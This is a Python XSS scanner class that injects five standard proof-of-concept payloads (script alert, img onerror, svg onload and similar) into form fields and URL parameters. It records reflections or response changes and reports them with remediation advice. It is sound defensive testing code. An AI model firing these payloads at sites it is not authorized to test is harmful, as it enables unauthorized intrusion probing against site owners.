# xss_tester.py
import requests, json, time, logging, difflib
from urllib.parse import urlparse, urlunparse, urlencode

class XssTester:
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
    ]
    INJECTABLE_TYPES = {'text','search','email','url','tel','password','textarea'}

    def __init__(self, session=None, delay=1, timeout=10, similarity_threshold=0.85):
        self.session = session or requests.Session()
        self.delay = delay
        self.timeout = timeout
        self.similarity_threshold = similarity_threshold
        self.vulnerabilities = []
        logging.basicConfig(filename='xss_tester.log', level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def run_tests(self, metadata):
        for page in metadata:
            url = page.get('url')
            forms = page.get('forms', [])
            query_params = page.get('query_params', {})
            baseline_resp = self._baseline_request(url,forms,query_params)
            baseline_text = baseline_resp.text.lower() if baseline_resp else ''

            for form in forms:
                self.test_form(url, form, baseline_text)
            if query_params:
                self.test_url_params(url, query_params, baseline_text)

    def _baseline_request(self,url,forms,query_params):
        try:
            if forms:
                inputs = forms[0].get('inputs',[])
                data = {inp.get('name'):' ' for inp in inputs if inp.get('name')}
                action = forms[0].get('action') or url
                method = forms[0].get('method','GET').upper()
                if method=='POST': return self.session.post(action,data=data,timeout=self.timeout)
                else: return self.session.get(action,params=data,timeout=self.timeout)
            else:
                params = {k:v[0] if isinstance(v,(list,tuple)) else v for k,v in query_params.items()}
                return self.session.get(url,params=params,timeout=self.timeout)
        except: return None

    def test_form(self,url,form,baseline_text):
        action = form.get('action') or url
        method = form.get('method','GET').upper()
        inputs = form.get('inputs',[])
        data = {inp.get('name'):inp.get('value','') for inp in inputs if inp.get('name')}
        injectable = [inp.get('name') for inp in inputs if inp.get('type','text').lower() in self.INJECTABLE_TYPES and inp.get('name')]

        if not injectable: return
        for payload in self.XSS_PAYLOADS:
            test_data = data.copy()
            for name in injectable: test_data[name] = payload
            try:
                if method=='POST': resp = self.session.post(action,data=test_data,timeout=self.timeout)
                else: resp = self.session.get(action,params=test_data,timeout=self.timeout)
                self.analyze_response(url,'form',action,test_data,resp,payload,baseline_text)
                time.sleep(self.delay)
            except: continue

    def test_url_params(self,url,query_params,baseline_text):
        parsed = urlparse(url)
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,'','',''))
        params = {k:v[0] if isinstance(v,(list,tuple)) else v for k,v in query_params.items()}

        for param in params.keys():
            for payload in self.XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{base_url}?{urlencode(test_params)}"
                try:
                    resp = self.session.get(test_url,timeout=self.timeout)
                    self.analyze_response(url,'url_param',param,test_params,resp,payload,baseline_text)
                    time.sleep(self.delay)
                except: continue

    def analyze_response(self,url,test_type,target,data,response,payload,baseline_text):
        if not response: return
        content = response.text.lower()
        if payload.lower() in content:
            self.record_vulnerability(url,test_type,target,data,response,'direct_presence')
        else:
            similarity = difflib.SequenceMatcher(None, baseline_text, content).ratio()
            if similarity < self.similarity_threshold:
                self.record_vulnerability(url,test_type,target,data,response,'behavioral_difference')

    def record_vulnerability(self,url,test_type,target,data,response,method):
        vuln = {
            'url':url,'test_type':test_type,'target':target,'payload':data,
            'http_status': response.status_code if response else None,
            'detection_method':method,
            'evidence': (response.text[:300] if response else '')
        }
        self.vulnerabilities.append(vuln)

    def generate_report(self,out_file='xss_report.json'):
        report = {
            'total_vulnerabilities':len(self.vulnerabilities),
            'vulnerabilities':self.vulnerabilities,
            'recommendations':[
                "Validate and sanitize all user inputs.",
                "Encode outputs to prevent HTML/JS injection.",
                "Use frameworks that automatically escape dangerous characters.",
                "Implement Content Security Policy (CSP)."
            ]
        }
        with open(out_file,'w') as f:
            json.dump(report,f,indent=4)
